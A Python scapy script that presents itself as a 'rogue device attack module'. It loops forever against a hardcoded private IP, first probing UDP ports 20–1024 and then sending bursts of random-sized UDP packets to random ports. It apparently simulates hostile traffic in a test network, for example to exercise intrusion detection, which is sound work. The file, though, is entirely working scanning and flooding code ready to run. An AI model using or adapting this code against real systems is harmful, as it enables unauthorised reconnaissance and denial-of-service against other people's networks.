import os
import random
import sys
import time
from scapy.all import IP, UDP, Raw, send
TARGET_IP: str = '172.20.0.10'
SCAN_PORT_START: int = 20
SCAN_PORT_END: int = 1024
SCAN_PROBE_SIZE: int = 4
SCAN_DELAY_SECONDS: float = 0.1
FLOOD_BURST_COUNT: int = 50
FLOOD_MIN_PAYLOAD: int = 512
FLOOD_MAX_PAYLOAD: int = 1400
FLOOD_DELAY_SECONDS: float = 0.05
CYCLE_PAUSE_SECONDS: float = 5.0

def port_scan(target: str, start_port: int, end_port: int) -> None:
    print(f'[ROGUE] Starting port scan on {target} ports {start_port}-{end_port}', flush=True)
    for port in range(start_port, end_port + 1):
        probe_payload = os.urandom(SCAN_PROBE_SIZE)
        packet = IP(dst=target) / UDP(dport=port) / Raw(load=probe_payload)
        try:
            send(packet, verbose=False)
            print(f'[ROGUE][SCAN] Probed {target}:{port}  ({SCAN_PROBE_SIZE} bytes)', flush=True)
        except PermissionError as exc:
            print(f'[ROGUE][SCAN][ERROR] Permission denied on port {port}: {exc}', file=sys.stderr, flush=True)
        except OSError as exc:
            print(f'[ROGUE][SCAN][ERROR] OS/network error on port {port}: {exc}', file=sys.stderr, flush=True)
        except Exception as exc:
            print(f'[ROGUE][SCAN][ERROR] Unexpected error on port {port}: {exc}', file=sys.stderr, flush=True)
        try:
            time.sleep(SCAN_DELAY_SECONDS)
        except KeyboardInterrupt:
            raise
    print(f'[ROGUE] Port scan complete ({end_port - start_port + 1} ports probed)', flush=True)

def udp_flood(target: str, burst_count: int) -> None:
    print(f'[ROGUE] Starting UDP flood on {target}  burst_count={burst_count}', flush=True)
    for i in range(1, burst_count + 1):
        dst_port = random.randint(1, 65535)
        payload_size = random.randint(FLOOD_MIN_PAYLOAD, FLOOD_MAX_PAYLOAD)
        payload = os.urandom(payload_size)
        packet = IP(dst=target) / UDP(dport=dst_port) / Raw(load=payload)
        try:
            send(packet, verbose=False)
            print(f'[ROGUE][FLOOD] Packet {i}/{burst_count} -> {target}:{dst_port}  ({payload_size} bytes)', flush=True)
        except PermissionError as exc:
            print(f'[ROGUE][FLOOD][ERROR] Permission denied: {exc}', file=sys.stderr, flush=True)
        except OSError as exc:
            print(f'[ROGUE][FLOOD][ERROR] OS/network error: {exc}', file=sys.stderr, flush=True)
        except Exception as exc:
            print(f'[ROGUE][FLOOD][ERROR] Unexpected error: {exc}', file=sys.stderr, flush=True)
        try:
            time.sleep(FLOOD_DELAY_SECONDS)
        except KeyboardInterrupt:
            raise
    print(f'[ROGUE] UDP flood burst complete ({burst_count} packets sent)', flush=True)

def main() -> None:
    print(f'[ROGUE] Rogue device attack module initialised  target={TARGET_IP}  scan_ports={SCAN_PORT_START}-{SCAN_PORT_END}  flood_burst={FLOOD_BURST_COUNT}', flush=True)
    cycle = 0
    try:
        while True:
            cycle += 1
            print(f'\n[ROGUE] ===== Attack cycle {cycle} =====', flush=True)
            port_scan(TARGET_IP, SCAN_PORT_START, SCAN_PORT_END)
            udp_flood(TARGET_IP, FLOOD_BURST_COUNT)
            print(f'[ROGUE] Cycle {cycle} finished. Pausing {CYCLE_PAUSE_SECONDS}s before next cycle...', flush=True)
            time.sleep(CYCLE_PAUSE_SECONDS)
    except KeyboardInterrupt:
        print('\n[ROGUE] Shutting down gracefully.', flush=True)
    except Exception as exc:
        print(f'[ROGUE][FATAL] Unrecoverable error in main loop: {exc}', file=sys.stderr, flush=True)
        sys.exit(1)
if __name__ == '__main__':
    main()